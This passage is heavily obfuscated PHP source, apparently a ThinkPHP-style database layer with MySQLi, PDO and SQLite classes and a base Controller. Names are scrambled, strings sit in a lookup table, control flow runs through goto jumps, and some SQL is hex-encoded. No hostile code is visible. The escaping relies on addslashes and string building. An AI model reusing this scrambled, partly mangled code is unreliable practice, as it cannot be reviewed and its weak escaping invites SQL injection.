›[$e¿È¼é‰Ç[42]] === $e¿È¼é‰Ç[43]), $e¿È¼é‰Ç[44] => $EõÏ©Šˆ ›[$e¿È¼é‰Ç[45]], $e¿È¼é‰Ç[46] => strtolower($EõÏ©Šˆ ›[$e¿È¼é‰Ç[47]]) == $e¿È¼é‰Ç[48], $e¿È¼é‰Ç[49] => strtolower($EõÏ©Šˆ ›[$e¿È¼é‰Ç[50]]) == $e¿È¼é‰Ç[51]); } } return $EÊë»„“š; } public function getTables($D»½ñùØ„˜ = '') { $Cœ×ƒ¡íé =& $_SERVER[£¶ä½¶¢]; $e¯ñÒîÒ»ø = !empty($D»½ñùØ„˜) ? $Cœ×ƒ¡íé[857] . $D»½ñùØ„˜ . $Cœ×ƒ¡íé[858] : $Cœ×ƒ¡íé[859]; $E›™Úå›¿È = $this->query($e¯ñÒîÒ»ø); $d³®´âÒº° = array(); if ($E›™Úå›¿È) { foreach ($E›™Úå›¿È as $CÛÁŸĞ·±‘ => $AˆâªÎ¥ğÒ) { $d³®´âÒº°[$CÛÁŸĞ·±‘] = current($AˆâªÎ¥ğÒ); } } return $d³®´âÒº°; } public function replace($BËÔ½˜êÅ¡, $C¢ß¿ÔÆ™ä = array()) { $aÑõ¾ÑÀ´Î =& $_SERVER[£¶ä½¶¢]; foreach ($BËÔ½˜êÅ¡ as $e­£õÙ·³Õ => $Eéí‡äâ¯©) { $eë¥ƒéğ¦Ç = $this->parseValue($Eéí‡äâ¯©); if (is_scalar($eë¥ƒéğ¦Ç)) { $cÌÌ¶Û§íĞ[] = $eë¥ƒéğ¦Ç; $e„ˆ ö™‰¸[] = $this->parseKey($e­£õÙ·³Õ); } } $B‡“¶Ÿ¬ Ì = $aÑõ¾ÑÀ´Î[860] . $this->parseTable($C¢ß¿ÔÆ™ä[$aÑõ¾ÑÀ´Î[286]]) . $aÑõ¾ÑÀ´Î[861] . implode($aÑõ¾ÑÀ´Î[57], $e„ˆ ö™‰¸) . $aÑõ¾ÑÀ´Î[862] . implode($aÑõ¾ÑÀ´Î[57], $cÌÌ¶Û§íĞ) . $aÑõ¾ÑÀ´Î[863]; return $this->execute($B‡“¶Ÿ¬ Ì); } public function insertAll($d‡‚ÜŒâ‚ø, $Cù°Ğ°ÃŠæ = array(), $C­½ºÕ§ğ = false) { goto e‡ÄíÀµò; e‡ÄíÀµò: $D¾ŞŒëèÎ =& $_SERVER[£¶ä½¶¢]; if (!is_array($d‡‚ÜŒâ‚ø[0])) { return !1; } $CÂŸŒİë  = array_keys($d‡‚ÜŒâ‚ø[0]); goto c™œğÆ¬…; FÜ•‰Á§õ: $aô¼ˆ³ÀĞÖ = $C­½ºÕ§ğ ? $D¾ŞŒëèÎ[865] : $D¾ŞŒëèÎ[866]; $b—ˆÄŒ³¾ = $aô¼ˆ³ÀĞÖ . $D¾ŞŒëèÎ[867] . $this->parseTable($Cù°Ğ°ÃŠæ[$D¾ŞŒëèÎ[286]]) . $D¾ŞŒëèÎ[861] . implode($D¾ŞŒëèÎ[57], $CÂŸŒİë ) . $D¾ŞŒëèÎ[868] . implode($D¾ŞŒëèÎ[57], $D‘É—Ù­¨Ÿ); return $this->execute($b—ˆÄŒ³¾); goto DÛ¨Â×¡“; c™œğÆ¬…: $D‘É—Ù­¨Ÿ = array(); foreach ($d‡‚ÜŒâ‚ø as $d…Æƒ‡‘˜é) { $D”°†çîˆÁ = array(); foreach ($d…Æƒ‡‘˜é as $eÓª•…–’ => $a‘îô™Ô) { $a‘îô™Ô = $this->parseValue($a‘îô™Ô); if (is_scalar($a‘îô™Ô)) { $D”°†çîˆÁ[] = $a‘îô™Ô; } } $D‘É—Ù­¨Ÿ[] = $D¾ŞŒëèÎ[267] . implode($D¾ŞŒëèÎ[57], $D”°†çîˆÁ) . $D¾ŞŒëèÎ[863]; } array_walk($CÂŸŒİë , array($this, $D¾ŞŒëèÎ[864])); goto FÜ•‰Á§õ; DÛ¨Â×¡“: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bÚ±Õ¦çø =& $_SERVER[£¶ä½¶¢]; $this->error = $this->_linkID->errno . $bÚ±Õ¦çø[14] . $this->_linkID->error; if ($bÚ±Õ¦çø[43] != $this->queryStr) { $this->error .= LNG($bÚ±Õ¦çø[55]) . $this->queryStr; } think_trace($this->error, $bÚ±Õ¦çø[43], $bÚ±Õ¦çø[56]); return $this->error; } public function escapeString($B„Ç½¢ñî«) { if ($this->_linkID) { return $this->_linkID->real_escape_string($B„Ç½¢ñî«); } else { return addslashes($B„Ç½¢ñî«); } } public function parseKey(&$EŒ×ÒÏŠÈ—, $BÒ÷öìÅæ = true) { $D„ï„³ŒË³ =& $_SERVER[£¶ä½¶¢]; if ($BÒ÷öìÅæ) { $EŒ×ÒÏŠÈ— = $this->parseKeyCheck($EŒ×ÒÏŠÈ—); } if ($EŒ×ÒÏŠÈ— != $D„ï„³ŒË³[192] && !preg_match($D„ï„³ŒË³[869], $EŒ×ÒÏŠÈ—)) { $EŒ×ÒÏŠÈ— = $D„ï„³ŒË³[390] . trim($EŒ×ÒÏŠÈ—, $D„ï„³ŒË³[390]) . $D„ï„³ŒË³[390]; } return $EŒ×ÒÏŠÈ—; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($EùÕâ…Àºö = '') { $BóĞğŠ¤ª¦ =& $_SERVER[£¶ä½¶¢]; if (!class_exists($BóĞğŠ¤ª¦[871])) { think_exception(think_lang($BóĞğŠ¤ª¦[20]) . $BóĞğŠ¤ª¦[872]); } if (!empty($EùÕâ…Àºö)) { $this->config = $EùÕâ…Àºö; if (empty($this->config[$BóĞğŠ¤ª¦[23]])) { $this->config[$BóĞğŠ¤ª¦[23]] = array(); } } } public function connect($f­”Á–íˆ¹ = '', $Cƒ§ñ¶ ğ = 0) { $d¦ŠÛñƒ‰Ş =& $_SERVER[£¶ä½¶¢]; if (!isset($this->linkID[$Cƒ§ñ¶ ğ])) { goto bÍÕà¬Û›é; cåØÜçÚ…æ: if (1 != think_config($d¦ŠÛñƒ‰Ş[28])) { unset($this->config); } goto DÅ†ôÅ¥¨Ó; bÍÕà¬Û›é: if (empty($f­”Á–íˆ¹)) { $f­”Á–íˆ¹ = $this->config; } $f”¾Ù°Ñ = !empty($f­”Á–íˆ¹[$d¦ŠÛñƒ‰Ş[23]][$d¦ŠÛñƒ‰Ş[24]]) ? $f­”Á–íˆ¹[$d¦ŠÛñƒ‰Ş[23]][$d¦ŠÛñƒ‰Ş[24]] : $this->pconnect; if ($f”¾Ù°Ñ) { $f­”Á–íˆ¹[$d¦ŠÛñƒ‰Ş[23]][PDO::ATTR_PERSISTENT] = !0; } goto E°àæª÷ŒŒ; eÎÍæ˜Äºä: if (!$this->linkID[$Cƒ§ñ¶ ğ]) { think_exception($d¦ŠÛñƒ‰Ş[881]); } try { $this->linkID[$Cƒ§ñ¶ ğ]->exec($d¦ŠÛñƒ‰Ş[882] . think_config($d¦ŠÛñƒ‰Ş[849])); } catch (Exception $Bã×¤Óäì§) { } $this->connected = !0; goto cåØÜçÚ…æ; E°àæª÷ŒŒ: try { $this->linkID[$Cƒ§ñ¶ ğ] = new PDO($f­”Á–íˆ¹[$d¦ŠÛñƒ‰Ş[873]], $f­”Á–íˆ¹[$d¦ŠÛñƒ‰Ş[846]], $f­”Á–íˆ¹[$d¦ŠÛñƒ‰Ş[847]], $f­”Á–íˆ¹[$d¦ŠÛñƒ‰Ş[23]]); } catch (PDOException $Bã×¤Óäì§) { think_exception($Bã×¤Óäì§->getMessage()); } $this->dbType = $this->_getDsnType($f­”Á–íˆ¹[$d¦ŠÛñƒ‰Ş[873]]); if (in_array($this->dbType, array($d¦ŠÛñƒ‰Ş[874], $d¦ŠÛñƒ‰Ş[875], $d¦ŠÛñƒ‰Ş[876], $d¦ŠÛñƒ‰Ş[877]))) { think_exception($d¦ŠÛñƒ‰Ş[878] . $this->dbType . $d¦ŠÛñƒ‰Ş[879] . $this->dbType . $d¦ŠÛñƒ‰Ş[880]); } goto eÎÍæ˜Äºä; DÅ†ôÅ¥¨Ó: } return $this->linkID[$Cƒ§ñ¶ ğ]; } public function free() { $this->PDOStatement = null; } public function query($FÏªŠÖÃ©Ö, $DßáÅˆ‰Ï = array()) { goto c—‰›‡Í‹»; EÃÔˆ¿Ÿ½¯: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $BÄÙÉØ·Ş = $this->PDOStatement->execute($DßáÅˆ‰Ï); $this->debug(); goto D†°é‰¾ã‰; BÃÏåšÒÊ›: think_action_status($b³‹¯Ë·âê[29], 1); think_status($b³‹¯Ë·âê[30]); $this->PDOStatement = $this->_linkID->prepare($FÏªŠÖÃ©Ö); goto EÃÔˆ¿Ÿ½¯; D†°é‰¾ã‰: if (!1 === $BÄÙÉØ·Ş) { $this->error(); return !1; } else { return $this->getAll(); } goto FŸÓÛÎ–»; c—‰›‡Í‹»: $b³‹¯Ë·âê =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C¶¤Áò±ò; C¶¤Áò±ò: $this->queryStr = $FÏªŠÖÃ©Ö; if (!empty($DßáÅˆ‰Ï)) { $this->queryStr .= $b³‹¯Ë·âê[883] . print_r($DßáÅˆ‰Ï, !0) . $b³‹¯Ë·âê[884]; } if (!empty($this->PDOStatement)) { $this->free(); } goto BÃÏåšÒÊ›; FŸÓÛÎ–»: } public function execute($f„Üø‘œáÅ, $FƒëÇ—¤ß = array()) { goto d¬¶ï¢à¹·; cäí¥˜Ëã: if ($this->dbType == $Aš³­­ö¨æ[877]) { if (preg_match($Aš³­­ö¨æ[885], $this->queryStr, $FËÂÓ˜Æ»½)) { $this->table = think_config($Aš³­­ö¨æ[886]) . str_ireplace(think_config($Aš³­­ö¨æ[887]), $Aš³­­ö¨æ[13], $FËÂÓ˜Æ»½[2]); $C‹ìÈ•›¶ = (bool) $this->query($Aš³­­ö¨æ[888] . strtoupper($this->table) . $Aš³­­ö¨æ[65]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Aš³­­ö¨æ[31], 1); goto a…ƒÜØ³³ç; d¬¶ï¢à¹·: $Aš³­­ö¨æ =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d¼ÎÁÈÃ; c‚ÔäÜÏã¡: $EàÓ‘ùÕçÕ = $this->PDOStatement->execute($FƒëÇ—¤ß); $this->debug(); if (!1 === $EàÓ‘ùÕçÕ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($C‹ìÈ•›¶ || preg_match($Aš³­­ö¨æ[889], $f„Üø‘œáÅ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto B²š‘Å‚á£; d¼ÎÁÈÃ: $this->queryStr = $f„Üø‘œáÅ; if (!empty($FƒëÇ—¤ß)) { $this->queryStr .= $Aš³­­ö¨æ[883] . print_r($FƒëÇ—¤ß, !0) . $Aš³­­ö¨æ[884]; } $C‹ìÈ•›¶ = !1; goto cäí¥˜Ëã; a…ƒÜØ³³ç: think_status($Aš³­­ö¨æ[30]); $this->PDOStatement = $this->_linkID->prepare($f„Üø‘œáÅ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto c‚ÔäÜÏã¡; B²š‘Å‚á£: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a¤ÉÖì¶¡ = $this->_linkID->commit(); $this->transTimes = 0; if (!$a¤ÉÖì¶¡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d¬ä³ãŠ­® = $this->_linkID->rollback(); $this->transTimes = 0; if (!$d¬ä³ãŠ­®) { $this->error(); return !1; } } return !0; } private function getAll() { $D’ŒÂ‡î†Ê = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($D’ŒÂ‡î†Ê); return $D’ŒÂ‡î†Ê; } public function getFields($A†öØáÒâŸ) { goto AÇ²Ÿ‡¾Ğ¬; eë‰àÉ¥ó›: $FˆÊñ«ÍŒğ = $this->query($AƒßğØ…öØ); $dÃŒääÛ›â = array(); if ($FˆÊñ«ÍŒğ) { foreach ($FˆÊñ«ÍŒğ as $b’–éæÏ’ => $e‡™¤³à¤±) { $e‡™¤³à¤± = array_change_key_case($e‡™¤³à¤±); $e‡™¤³à¤±[$Eáğ½ïôä[38]] = isset($e‡™¤³à¤±[$Eáğ½ïôä[38]]) ? $e‡™¤³à¤±[$Eáğ½ïôä[38]] : $Eáğ½ïôä[13]; $e‡™¤³à¤±[$Eáğ½ïôä[39]] = isset($e‡™¤³à¤±[$Eáğ½ïôä[39]]) ? $e‡™¤³à¤±[$Eáğ½ïôä[39]] : $Eáğ½ïôä[13]; $d—ˆ»ë²‘Š = isset($e‡™¤³à¤±[$Eáğ½ïôä[280]]) ? $e‡™¤³à¤±[$Eáğ½ïôä[280]] : $e‡™¤³à¤±[$Eáğ½ïôä[38]]; $dÃŒääÛ›â[$d—ˆ»ë²‘Š] = array($Eáğ½ïôä[38] => $d—ˆ»ë²‘Š, $Eáğ½ïôä[39] => $e‡™¤³à¤±[$Eáğ½ïôä[39]], $Eáğ½ïôä[41] => (bool) (isset($e‡™¤³à¤±[$Eáğ½ïôä[113]]) && $e‡™¤³à¤±[$Eáğ½ïôä[113]] === $Eáğ½ïôä[43] || isset($e‡™¤³à¤±[$Eáğ½ïôä[41]]) && $e‡™¤³à¤±[$Eáğ½ïôä[41]] === $Eáğ½ïôä[43]), $Eáğ½ïôä[44] => isset($e‡™¤³à¤±[$Eáğ½ïôä[44]]) ? $e‡™¤³à¤±[$Eáğ½ïôä[44]] : (isset($e‡™¤³à¤±[$Eáğ½ïôä[63]]) ? $e‡™¤³à¤±[$Eáğ½ïôä[63]] : $Eáğ½ïôä[13]), $Eáğ½ïôä[46] => isset($e‡™¤³à¤±[$Eáğ½ïôä[103]]) ? strtolower($e‡™¤³à¤±[$Eáğ½ïôä[103]]) == $Eáğ½ïôä[48] : (isset($e‡™¤³à¤±[$Eáğ½ïôä[64]]) ? $e‡™¤³à¤±[$Eáğ½ïôä[64]] : !1), $Eáğ½ïôä[49] => isset($e‡™¤³à¤±[$Eáğ½ïôä[906]]) ? strtolower($e‡™¤³à¤±[$Eáğ½ïôä[906]]) == $Eáğ½ïôä[51] : (isset($e‡™¤³à¤±[$Eáğ½ïôä[103]]) ? $e‡™¤³à¤±[$Eáğ½ïôä[103]] : !1)); } } goto Dì§ä„Ù; Dì§ä„Ù: return $dÃŒääÛ›â; goto Fâ³ß…‡µ; AÇ²Ÿ‡¾Ğ¬: $Eáğ½ïôä =& $_SERVER[£¶ä½¶¢]; $this->initConnect(!0); if (think_config($Eáğ½ïôä[890])) { $AƒßğØ…öØ = str_replace($Eáğ½ïôä[891], $A†öØáÒâŸ, think_config($Eáğ½ïôä[890])); } else { switch ($this->dbType) { case $Eáğ½ïôä[874]: case $Eáğ½ïôä[892]: $AƒßğØ…öØ = "\x53\x45\x4c\105\x43\124\40\x20\x20\143\x6f\x6c\x75\155\156\137\x6e\141\155\x65\40\x61\163\40\47\x4e\x61\x6d\x65\x27\54\x20\x20\x20\x64\x61\164\x61\137\164\x79\x70\145\x20\141\x73\x20\x27\x54\171\160\x65\47\54\x20\40\40\143\157\154\165\155\x6e\137\x64\145\x66\x61\x75\154\164\40\x61\163\40\47\x44\145\146\x61\165\x6c\x74\47\54\x20\x20\x20\x69\163\x5f\156\x75\x6c\154\141\142\154\145\40\x61\163\x20\x27\116\x75\154\x6c\x27\xa\x9\11\106\x52\117\x4d\x9\x69\x6e\146\x6f\162\155\x61\164\x69\x6f\x6e\x5f\x73\143\x68\x65\155\x61\x2e\164\x61\142\154\x65\163\x20\x41\123\x20\x74\12\11\x9\112\117\111\116\x9\151\156\146\157\162\155\x61\x74\151\x6f\x6e\137\x73\x63\150\x65\x6d\x61\x2e\x63\157\154\x75\155\156\x73\x20\x41\x53\x20\x63\12\11\x9\117\116\x20\40\164\56\x74\141\142\x6c\145\x5f\x63\x61\164\141\154\x6f\147\x20\75\x20\x63\56\x74\141\142\x6c\145\x5f\143\141\x74\141\154\157\147\12\x9\x9\101\116\x44\x20\164\x2e\x74\141\x62\154\145\x5f\163\143\x68\145\x6d\141\40\x3d\40\x63\56\164\141\x62\x6c\145\137\x73\x63\x68\x65\x6d\141\12\11\11\101\116\x44\x20\164\x2e\164\x61\142\154\145\137\156\x61\155\145\40\75\40\x63\x2e\x74\141\142\x6c\x65\x5f\156\x61\x6d\145\12\11\11\x57\110\x45\122\x45\40\x20\40\164\x2e\x74\x61\x62\x6c\x65\x5f\x6e\141\x6d\x65\x20\75\x20\47{$A†öØáÒâŸ}\47"; break; case $Eáğ½ïôä[893]: $AƒßğØ…öØ = $Eáğ½ïôä[894] . $A†öØáÒâŸ . $Eáğ½ïôä[895]; break; case $Eáğ½ïôä[875]: case $Eáğ½ïôä[877]: $AƒßğØ…öØ = $Eáğ½ïôä[896] . $Eáğ½ïôä[897] . $Eáğ½ïôä[898] . strtoupper($A†öØáÒâŸ) . $Eáğ½ïôä[899] . strtoupper($A†öØáÒâŸ) . $Eáğ½ïôä[900]; break; case $Eáğ½ïôä[901]: $AƒßğØ…öØ = $Eáğ½ïôä[902] . $A†öØáÒâŸ . $Eáğ½ïôä[903]; break; case $Eáğ½ïôä[876]: break; case $Eáğ½ïôä[904]: default: $AƒßğØ…öØ = $Eáğ½ïôä[905] . ($this->dbType == $Eáğ½ïôä[904] ? "\140{$A†öØáÒâŸ}\140" : $A†öØáÒâŸ); } } goto eë‰àÉ¥ó›; Fâ³ß…‡µ: } public function getTables($AáÕø¼– Œ = '') { $b“ºªìÑ°ƒ =& $_SERVER[£¶ä½¶¢]; if (think_config($b“ºªìÑ°ƒ[907])) { $F­ñ®¯¸İé = str_replace($b“ºªìÑ°ƒ[908], $AáÕø¼– Œ, think_config($b“ºªìÑ°ƒ[907])); } else { switch ($this->dbType) { case $b“ºªìÑ°ƒ[875]: case $b“ºªìÑ°ƒ[877]: $F­ñ®¯¸İé = $b“ºªìÑ°ƒ[909]; break; case $b“ºªìÑ°ƒ[874]: case $b“ºªìÑ°ƒ[892]: $F­ñ®¯¸İé = $b“ºªìÑ°ƒ[910]; break; case $b“ºªìÑ°ƒ[901]: $F­ñ®¯¸İé = $b“ºªìÑ°ƒ[911]; break; case $b“ºªìÑ°ƒ[876]: think_exception(think_lang($b“ºªìÑ°ƒ[912]) . $b“ºªìÑ°ƒ[913]); break; case $b“ºªìÑ°ƒ[893]: $F­ñ®¯¸İé = $b“ºªìÑ°ƒ[52] . $b“ºªìÑ°ƒ[53] . $b“ºªìÑ°ƒ[54]; break; case $b“ºªìÑ°ƒ[904]: default: if (!empty($AáÕø¼– Œ)) { $F­ñ®¯¸İé = $b“ºªìÑ°ƒ[857] . $AáÕø¼– Œ . $b“ºªìÑ°ƒ[858]; } else { $F­ñ®¯¸İé = $b“ºªìÑ°ƒ[859]; } } } $FÁİ£’ÔóŒ = $this->query($F­ñ®¯¸İé); $F’Òƒ®Å­ê = array(); foreach ($FÁİ£’ÔóŒ as $eŸ§èäé°… => $Bƒ…¦í§”Š) { $F’Òƒ®Å­ê[$eŸ§èäé°…] = current($Bƒ…¦í§”Š); } return $F’Òƒ®Å­ê; } protected function parseLimit($fÇë…šƒ‰) { $FøéŠÕœî— =& $_SERVER[£¶ä½¶¢]; $d´ï®—ô… = $FøéŠÕœî—[43]; if (!empty($fÇë…šƒ‰)) { switch ($this->dbType) { case $FøéŠÕœî—[901]: case $FøéŠÕœî—[893]: $fÇë…šƒ‰ = explode($FøéŠÕœî—[57], $fÇë…šƒ‰); if (count($fÇë…šƒ‰) > 1) { $d´ï®—ô… .= $FøéŠÕœî—[58] . $fÇë…šƒ‰[1] . $FøéŠÕœî—[59] . $fÇë…šƒ‰[0] . $FøéŠÕœî—[60]; } else { $d´ï®—ô… .= $FøéŠÕœî—[58] . $fÇë…šƒ‰[0] . $FøéŠÕœî—[60]; } break; case $FøéŠÕœî—[874]: case $FøéŠÕœî—[892]: break; case $FøéŠÕœî—[876]: break; case $FøéŠÕœî—[875]: case $FøéŠÕœî—[877]: break; case $FøéŠÕœî—[904]: default: $d´ï®—ô… .= $FøéŠÕœî—[58] . $fÇë…šƒ‰ . $FøéŠÕœî—[60]; } } return $d´ï®—ô…; } public function parseKey(&$aµ¡­ˆ‘Ñ, $aæÇŞ»İõ‡ = true) { $cŒÙù†ÇÒ =& $_SERVER[£¶ä½¶¢]; if ($aæÇŞ»İõ‡) { $aµ¡­ˆ‘Ñ = $this->parseKeyCheck($aµ¡­ˆ‘Ñ); } if ($this->dbType == $cŒÙù†ÇÒ[904]) { if ($aµ¡­ˆ‘Ñ != $cŒÙù†ÇÒ[192] && !preg_match($cŒÙù†ÇÒ[869], $aµ¡­ˆ‘Ñ)) { $aµ¡­ˆ‘Ñ = $cŒÙù†ÇÒ[390] . trim($aµ¡­ˆ‘Ñ, $cŒÙù†ÇÒ[390]) . $cŒÙù†ÇÒ[390]; } return $aµ¡­ˆ‘Ñ; } else { return parent::parseKey($aµ¡­ˆ‘Ñ, $aæÇŞ»İõ‡); } } public function close() { $this->_linkID = null; } public function error() { $Bª °ÂÒ =& $_SERVER[£¶ä½¶¢]; if ($this->PDOStatement) { $cÇ«Ò•”„¡ = $this->PDOStatement->errorInfo(); $this->error = $cÇ«Ò•”„¡[1] . $Bª °ÂÒ[14] . $cÇ«Ò•”„¡[2]; } else { $this->error = $Bª °ÂÒ[43]; } if ($Bª °ÂÒ[43] != $this->queryStr) { $this->error .= LNG($Bª °ÂÒ[55]) . $this->queryStr; } think_trace($this->error, $Bª °ÂÒ[43], $Bª °ÂÒ[56]); return $this->error; } public function escapeString($Dâø”Ò¶õğ) { $f•Ó®õçê— =& $_SERVER[£¶ä½¶¢]; switch ($this->dbType) { case $f•Ó®õçê—[901]: case $f•Ó®õçê—[874]: case $f•Ó®õçê—[892]: case $f•Ó®õçê—[904]: return addslashes($Dâø”Ò¶õğ); case $f•Ó®õçê—[876]: case $f•Ó®õçê—[893]: case $f•Ó®õçê—[875]: case $f•Ó®õçê—[877]: return str_ireplace($f•Ó®õçê—[65], $f•Ó®õçê—[66], $Dâø”Ò¶õğ); } } protected function parseValue($Dåß‚–Ñº) { $F÷ï –…¥  =& $_SERVER[£¶ä½¶¢]; if (is_string($Dåß‚–Ñº)) { $cÅÊåÄÚ« = strpos($Dåß‚–Ñº, $F÷ï –…¥ [14]) === 0 && in_array($Dåß‚–Ñº, array_keys($this->bind)); $Dåß‚–Ñº = $cÅÊåÄÚ« ? $this->escapeString($Dåß‚–Ñº) : $F÷ï –…¥ [914] . $this->escapeString($Dåß‚–Ñº) . $F÷ï –…¥ [914]; } elseif (isset($Dåß‚–Ñº[0]) && is_string($Dåß‚–Ñº[0]) && strtolower($Dåß‚–Ñº[0]) == $F÷ï –…¥ [304]) { $Dåß‚–Ñº = $this->escapeString($Dåß‚–Ñº[1]); } elseif (is_array($Dåß‚–Ñº)) { $Dåß‚–Ñº = array_map(array($this, $F÷ï –…¥ [915]), $Dåß‚–Ñº); } elseif (is_bool($Dåß‚–Ñº)) { $Dåß‚–Ñº = $Dåß‚–Ñº ? $F÷ï –…¥ [97] : $F÷ï –…¥ [201]; } elseif (is_null($Dåß‚–Ñº)) { $Dåß‚–Ñº = $F÷ï –…¥ [113]; } return $Dåß‚–Ñº; } public function getLastInsertId() { $F‹ÔíõÂ…² =& $_SERVER[£¶ä½¶¢]; switch ($this->dbType) { case $F‹ÔíõÂ…²[901]: case $F‹ÔíõÂ…²[893]: case $F‹ÔíõÂ…²[874]: case $F‹ÔíõÂ…²[892]: case $F‹ÔíõÂ…²[876]: case $F‹ÔíõÂ…²[904]: return $this->_linkID->lastInsertId(); case $F‹ÔíõÂ…²[875]: case $F‹ÔíõÂ…²[877]: $bŒâÂ‡‘¸× = $this->table; $B¨éÊ»Òî = $this->query("\123\x45\x4c\105\x43\x54\x20{$bŒâÂ‡‘¸×}\x2e\x63\165\x72\x72\x76\x61\x6c\x20\143\165\x72\x72\x76\x61\154\x20\x46\x52\117\115\x20\144\165\x61\x6c"); return $B¨éÊ»Òî ? $B¨éÊ»Òî[0][$F‹ÔíõÂ…²[916]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($E¢Û‹Šğ†é) { $AÅÎ¼òöÙ» =& $_SERVER[£¶ä½¶¢]; if (!CacheLock::fileLock($AÅÎ¼òöÙ»[19])) { return !1; } $eÚÎ×„¥° = parent::query($E¢Û‹Šğ†é); CacheLock::fileUnLock($AÅÎ¼òöÙ»[19]); return $eÚÎ×„¥°; } public function execute($AËÇµÛè—‘) { $Fç»ÄÏÚğé =& $_SERVER[£¶ä½¶¢]; if (!CacheLock::fileLock($Fç»ÄÏÚğé[19])) { return !1; } $e†º½“Şœ£ = parent::execute($AËÇµÛè—‘); CacheLock::fileUnLock($Fç»ÄÏÚğé[19]); return $e†º½“Şœ£; } } goto d…’å±ˆèÑ; Eí‡¿—…çÚ: class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($c§Å˜¤òƒ, $D†ºĞ†ù) { $dŠáçÈ›ƒÇ =& $_SERVER[£¶ä½¶¢]; if (isset(self::$_methodList[$c§Å˜¤òƒ])) { return @call_user_func_array(self::$_methodList[$c§Å˜¤òƒ], $D†ºĞ†ù); } else { if (method_exists($this, $c§Å˜¤òƒ)) { return call_user_func_array(array($this, $c§Å˜¤òƒ), $D†ºĞ†ù); } else { think_exception(__CLASS__ . $dŠáçÈ›ƒÇ[14] . $c§Å˜¤òƒ . $dŠáçÈ›ƒÇ[15]); } } } public static function __callStatic($B¢ß¶¡¬Û®, $Fµ‹ĞæĞÛ©) { if (isset(self::$_methodListStatic[$B¢ß¶¡¬Û®])) { return call_user_func_array(self::$_methodListStatic[$B¢ß¶¡¬Û®], $Fµ‹ĞæĞÛ©); } else { if (method_exists(self, $B¢ß¶¡¬Û®)) { return call_user_func_array(array(self, $B¢ß¶¡¬Û®), $Fµ‹ĞæĞÛ©); } else { show_json("{$B¢ß¶¡¬Û®}\50\51\x20\156\157\164\x20\145\x78\151\163\164\x3b", !1); } } } public static function addMethod($CÅ‹¬¾¦”, $E¹¬ãì¾äê) { self::$_methodList[$CÅ‹¬¾¦”] = $E¹¬ãì¾äê; } public static function addMethodStatic($D¼†æ®á¨, $D½¶â÷ƒ) { self::$_methodListStatic[$D¼†æ®á¨] = $D½¶â÷ƒ; } } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto dÆ’±‰áîî; cÉ‘Ñ—‰ä: $this->tpl = TEMPLATE . MOD . $D°‰‹ñ£×[18]; $this->_classObjectID = mt_rand(0, 10000); goto fŠ¿ƒÆŒà½; cÈÉ¡œ¯Ğ: $this->in =& $in; $this->values[$D°‰‹ñ£×[16]] =& $config; $this->values[$D°‰‹ñ£×[17]] =& $in; goto cÉ‘Ñ—‰ä; dÆ’±‰áîî: $D°‰‹ñ£× =& $_SERVER[£¶ä½¶¢]; global $in, $config; $this->config =& $config; goto cÈÉ¡œ¯Ğ; fŠ¿ƒÆŒà½: } public function loadClass($e´­êÑÈ•ô) { if (1 === func_num_args()) { $this->{$e´­êÑÈ•ô} = new $e´­êÑÈ•ô(); } else { $a£Ê¹«”á = new ReflectionClass($e´­êÑÈ•ô); $BÏì³¨Üˆ‚ = func_get_args(); array_shift($BÏì³¨Üˆ‚); $this->{$e´­êÑÈ•ô} = $a£Ê¹«”á->newInstanceArgs($BÏì³¨Üˆ‚); } return $this->{$e´­êÑÈ•ô}; } protected function assign($f³¿†œô¥, $c…Ìäö÷Âé) { $this->values[$f³¿†œô¥] = $c…Ìäö÷Âé; } protected function display($EÇÑ°ùâ) { ob_end_clean(); extract($this->values); require $this->tpl . $EÇÑ°ùâ; } } class DbSqliteBase extends Db { public function __construct($F÷ÊÛ±Ãà = '') { $bÎœğ½Ë†É =& $_SERVER[£¶ä½¶¢]; if (!extension_loaded($bÎœğ½Ë†É[19])) { think_exception(think_lang($bÎœğ½Ë†É[20]) . $bÎœğ½Ë†É[21]); } if (!empty($F÷ÊÛ±Ãà)) { if (!isset($F÷ÊÛ±Ãà[$bÎœğ½Ë†É[22]])) { $F÷ÊÛ±Ãà[$bÎœğ½Ë†É[22]] = 438; } $this->config = $F÷ÊÛ±Ãà; if (empty($this->config[$bÎœğ½Ë†É[23]])) { $this->config[$bÎœğ½Ë†É[23]] = array(); } } } public function connect($FŒîãøˆÇÛ = '', $fö‰Å¼ÈÀ = 0) { $DêŞÒÖ’Ò =& $_SERVER[£¶ä½¶¢]; if (!isset($this->linkID[$fö‰Å¼ÈÀ])) { goto aá‘×™¶Ú; bµÆ¥Üˆìå: $this->linkID[$fö‰Å¼ÈÀ] = $D´ÄÁ¹Û ($FŒîãøˆÇÛ[$DêŞÒÖ’Ò[27]], $FŒîãøˆÇÛ[$DêŞÒÖ’Ò[22]]); if (!$this->linkID[$fö‰Å¼ÈÀ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto a‘†²¶; aá‘×™¶Ú: if (empty($FŒîãøˆÇÛ)) { $FŒîãøˆÇÛ = $this->config; } $f½š–§·˜‹ = !empty($FŒîãøˆÇÛ[$DêŞÒÖ’Ò[23]][$DêŞÒÖ’Ò[24]]) ? $FŒîãøˆÇÛ[$DêŞÒÖ’Ò[23]][$DêŞÒÖ’Ò[24]] : $this->pconnect; $D´ÄÁ¹Û  = $f½š–§·˜‹ ? $DêŞÒÖ’Ò[25] : 